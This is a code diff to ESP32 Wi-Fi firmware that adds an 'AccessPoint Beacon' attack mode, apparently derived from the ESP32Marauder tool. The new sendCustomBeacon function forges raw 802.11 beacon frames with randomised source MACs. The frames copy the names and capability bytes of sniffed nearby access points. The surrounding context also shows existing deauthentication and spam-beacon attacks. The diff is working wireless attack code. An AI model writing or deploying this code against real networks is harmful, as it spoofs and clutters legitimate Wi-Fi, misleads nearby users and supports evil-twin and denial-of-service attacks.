@@ -115,6 +115,13 @@ void WiFiModules::mainAttackLoop(WiFiScanState attack_mode) {
 				}
 		}
 	}
+	else if (attack_mode == WIFI_ATTACK_AP_BEACON) {
+		for (int i = 0; i < access_points->size(); i++) {
+			if (access_points->get(i).selected) {
+				sendCustomBeacon(access_points->get(i));     
+			}
+		}
+	}
 }
 
 void WiFiModules::StartMode(WiFiScanState mode) {
@@ -165,6 +172,10 @@ void WiFiModules::StartMode(WiFiScanState mode) {
 	else if (mode == WIFI_ATTACK_RIC_BEACON) {
 		this->StartWiFiAttack(mode);
 		Serial.println("[INFO] Starting [Rick Roll Beacon] Attack!");
+	}
+	else if (mode == WIFI_ATTACK_AP_BEACON) {
+		this->StartWiFiAttack(mode);
+		Serial.println("[INFO] Starting [AccessPoint Beacon] Attack!");
 	}
 }
 
@@ -449,6 +460,7 @@ void WiFiModules::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 					snifferPacket->payload[14],
 					snifferPacket->payload[15]},
 					security_type, wpastr, false, new LinkedList<uint16_t>(),
+					{snifferPacket->payload[34], snifferPacket->payload[35]},
 					static_cast<int8_t>(snifferPacket->rx_ctrl.rssi)};
 				
 				access_points->add(_temp_ap);
@@ -536,6 +548,7 @@ void WiFiModules::apstaSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t ty
 					snifferPacket->payload[14],
 					snifferPacket->payload[15]},
 					security_type, wpastr, false, new LinkedList<uint16_t>(),
+					{snifferPacket->payload[34], snifferPacket->payload[35]},
 					static_cast<int8_t>(snifferPacket->rx_ctrl.rssi)};
 				
 				access_points->add(_temp_ap);
@@ -865,6 +878,64 @@ void WiFiModules::StartAPWiFiScan() {
     vTaskDelay(100 / portTICK_PERIOD_MS);
 }
 
+// https://github.com/justcallmekoko/ESP32Marauder/blob/master/esp32_marauder/WiFiScan.cpp
+void WiFiModules::sendCustomBeacon(AccessPoint custom_ssid) {
+	if (!this->wifi_initialized) {
+		Serial.println("[ERROR] WiFi is not initialized, cannot send beacon frame.");
+		return;
+	}
+
+	channelRandom();
+	vTaskDelay(1 / portTICK_PERIOD_MS);  
+
+	// Randomize SRC MAC
+	beacon_frame_packet[10] = beacon_frame_packet[16] = random(256);
+	beacon_frame_packet[11] = beacon_frame_packet[17] = random(256);
+	beacon_frame_packet[12] = beacon_frame_packet[18] = random(256);
+	beacon_frame_packet[13] = beacon_frame_packet[19] = random(256);
+	beacon_frame_packet[14] = beacon_frame_packet[20] = random(256);
+	beacon_frame_packet[15] = beacon_frame_packet[21] = random(256);
+
+	char ESSID[custom_ssid.essid.length() + 1] = {};
+	custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);
+
+	int realLen = strlen(ESSID);
+	int ssidLen = random(realLen, 33);
+	int numSpace = ssidLen - realLen;
+	beacon_frame_packet[37] = ssidLen;
+
+	// Insert my tag
+	for(int i = 0; i < realLen; i++)
+		beacon_frame_packet[38 + i] = ESSID[i];
+
+	for(int i = 0; i < numSpace; i++)
+		beacon_frame_packet[38 + realLen + i] = 0x20;
+
+	/////////////////////////////
+	
+	beacon_frame_packet[50 + ssidLen] = set_channel;
+
+	uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
+						0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };
+
+	beacon_frame_packet[34] = custom_ssid.beacon[0];
+	beacon_frame_packet[35] = custom_ssid.beacon[1];
+	
+
+	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
+	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
+	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
+
+	packet_sent = packet_sent + 3;
+
+    if (res_1 != ESP_OK)
+		packet_sent -= 1;
+    if (res_2 != ESP_OK)
+		packet_sent -= 1;
+    if (res_3 != ESP_OK)
+		packet_sent -= 1;
+}
+
 void WiFiModules::sendCustomESSIDBeacon(const char* ESSID) {
 	if (!this->wifi_initialized) {
 		Serial.println("[ERROR] WiFi is not initialized, cannot send beacon frame.");
@@ -1012,7 +1083,7 @@ void WiFiModules::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t sta_mac
 		Serial.println("[ERROR] WiFi is not initialized, cannot send deauth frame.");
 		return;
 	}
-	
+
 	this->set_channel = channel;
 	changeChannel();
 	delay(1);
